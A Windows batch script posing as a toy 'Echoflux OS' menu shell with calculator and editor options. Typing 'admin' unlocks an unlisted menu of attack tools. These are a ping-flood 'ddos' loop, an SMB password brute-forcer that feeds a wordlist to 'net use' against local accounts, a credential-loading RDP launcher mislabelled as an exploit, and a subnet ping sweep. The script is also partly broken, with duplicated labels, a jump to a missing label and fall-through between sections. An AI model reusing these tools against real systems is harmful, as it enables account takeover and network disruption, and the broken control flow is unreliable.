@echo off
title Echoflux OS - Ivan labsuchagne
setlocal enabledelayedexpansion
chcp 65001 >nul

:main
cls
echo.
echo       [38;5;153m███████╗ ██████╗██╗  ██╗ ██████╗ ███████╗██╗     ██╗   ██╗██╗  ██╗     ██████╗ ███████╗
echo       [38;5;117m██╔════╝██╔════╝██║  ██║██╔═══██╗██╔════╝██║     ██║   ██║╚██╗██╔╝    ██╔═══██╗██╔════╝
echo       [38;5;75m█████╗  ██║     ███████║██║   ██║█████╗  ██║     ██║   ██║ ╚███╔╝     ██║   ██║███████╗
echo       [38;5;24m██╔══╝  ██║     ██╔══██║██║   ██║██╔══╝  ██║     ██║   ██║ ██╔██╗     ██║   ██║╚════██║
echo       [38;5;18m███████╗╚██████╗██║  ██║╚██████╔╝██║     ███████╗╚██████╔╝██╔╝ ██╗    ╚██████╔╝███████║
echo       [38;5;4m╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝ ╚══════╝                                                                                     
echo.                                                                                                 
pause
goto menu

:menu
cls
color 31
echo.
echo 1. Calculator
echo 2. Text Editor
echo 3. Browser
echo 4. List Directory
echo 5. Echo Message
echo 6. Run File
echo 7. Exit

echo.
set /p userInput=Choose an option:

if "%userInput%"=="1" goto calc
if "%userInput%"=="2" goto edit
if "%userInput%"=="3" goto browser
if "%userInput%"=="4" goto listDir
if "%userInput%"=="5" goto echoMessage
if "%userInput%"=="6" goto runFile
if "%userInput%"=="admin" goto admin
if "%userInput%"=="7" exit /b

echo Invalid choice! Try again.
pause
goto menu

:admin
cls
color c4
echo 1. ddos 
echo 2. SMBbrute
echo 3. rdp expliot
echo 4. scan ip 
echo 5. exit
set /p userInput=Choose an option:

if "%userInput%"=="1" goto ddos
if "%userInput%"=="2" goto bruteforce
if "%userInput%"=="3" goto rdp
if "%userInput%"=="4" goto Ipscan
if "%userInput%"=="5" exit /b

echo Invalid choice! Try again.
pause
goto menu

:ipscan
cls
color 31
echo IP Scanner
echo.

set /p startIP=Enter the base IP address (e.g., 192.168.1):
set /p startRange=Enter the starting last octet (1-254):
set /p endRange=Enter the ending last octet (1-254):

if %startRange% LSS 1 set startRange=1
if %startRange% GTR 254 set startRange=254
if %endRange% LSS 1 set endRange=1
if %endRange% GTR 254 set endRange=254

echo Scanning from %startIP%.%startRange% to %startIP%.%endRange%
echo.

for /L %%i in (%startRange%,1,%endRange%) do (
    set "currentIP=%startIP%.%%i"
    ping -n 1 !currentIP! | find "Reply from" >nul
    if !errorlevel! == 0 (
        echo !currentIP! is ONLINE
    ) else (
        echo !currentIP! is OFFLINE
    )
)
echo.
pause
goto menu

:rdp
set /p host="host>> "
set /p user="user>> "
set /p pass="pass>> "
cmdkey /add:%host% /user:%user% /pass:%pass%
mstsc /v:%host%
cmdkey /delete:%host%

:bruteforce
color 31
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p user=">> "
echo.
echo [PASSWORD LIST]
set /p wordlist=">> "
if not exist "%wordlist%" (
echo.
echo [91m[%error%][0m [97mFile not found[0m
pause >nul
goto mfsconsole
)
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
echo.
echo [91m[%error%][0m [97mUser doesn't exist[0m
pause >nul
goto mfsconsole
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
set pass=%%a
call :varset
)
echo.
echo [91m[%error%][0m [97mPassword not found[0m
pause >nul
goto mfsconsole

:varset
echo Attacking TARGET: !pass!
echo.
echo [ Attacking TARGET: !pass!
net use \\127.0.0.1 /user:%user% !pass! >nul 2>&1
if not errorlevel 1 (
call :success
)
goto :eof

:ddos
color 31
setlocal

:: Prompt for the IP address once
echo.
set /p ip=Enter IP Address to Ping: 

if "%ip%"=="" (
    echo IP address cannot be empty. Exiting.
    exit /b
)

:: Start the continuous ping loop
echo.
echo Pinging %ip% continuously. Press Ctrl+C to stop.
echo.

:ping_loop
:: Use -t for continuous ping and -n 1 to send only one ping per iteration
ping -n 1 -l 1000 %ip%
goto ping_loop

:calc
cls
color 31
echo Simple Calculator
set /p num1=Enter first number: 
set /p num2=Enter second number:
set /p operation=Enter operation (+, -, *, /):
set /a result=num1%operation%num2
echo.
echo Result: %result%
pause
goto menu

:edit
cls
color 31
echo Simple Text Editor
set /p filename=Enter the file name (with extension, e.g., myfile.txt):
start notepad "%filename%"
pause
goto menu

:browser
cls
color 31
echo Simple Browser
set /p url=Enter the URL to open (e.g., https://www.example.com):
start "" "%url%"
pause
goto menu

:listDir
cls
color 31
echo Listing Directory Contents
dir
pause
goto menu

:echoMessage
cls
color 31
set /p message=Enter the message to echo:
echo %message%
pause
goto menu

:runFile
cls
color 31
set /p fileToRun=Enter the file name to run (e.g., script.bat):
start "" "%fileToRun%"
pause
goto menu

:Bruteforce
cls
echo.
echo    ╔════════════════════╗
echo    ║  COMMANDS:         ║
echo    ║                    ║
echo    ║  1. List Users     ║
echo    ║  2. Bruteforce     ║
echo    ║  3. Exit           ║
echo    ╚════════════════════╝
:input
set /p "=>> " <nul
choice /c 123 >nul

if /I "%errorlevel%" EQU "1" (
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)

if /I "%errorlevel%" EQU "2" (
  goto bruteforce
)

if /I "%errorlevel%" EQU "3" (
  goto menu
)

:bruteforce
set /a count=1
echo.
echo [TARGET USER]
set /p user=">> "
echo.
echo [PASSWORD LIST]
set /p wordlist=">> "
if not exist "%wordlist%" (
  echo.
  echo  [91m[%error%] [0m  [97mFile not found [0m
  pause >nul
  goto Bruteforce
)
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo  [91m[%error%] [0m  [97mUser doesn't exist [0m
  pause >nul
  goto Bruteforce
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :varset
)
echo.
echo  [91m[%error%] [0m  [97mPassword not found [0m
pause >nul
goto Bruteforce

:success
echo.
echo  [92m[+] [0m  [97mPassword found: %pass% [0m
net use \\127.0.0.1 /d /y >nul 2>&1
set user=
set pass=
echo.
pause >nul
goto Bruteforce

:varset
net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if /I "%errorlevel%" EQU "0" goto success
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success
goto :eof
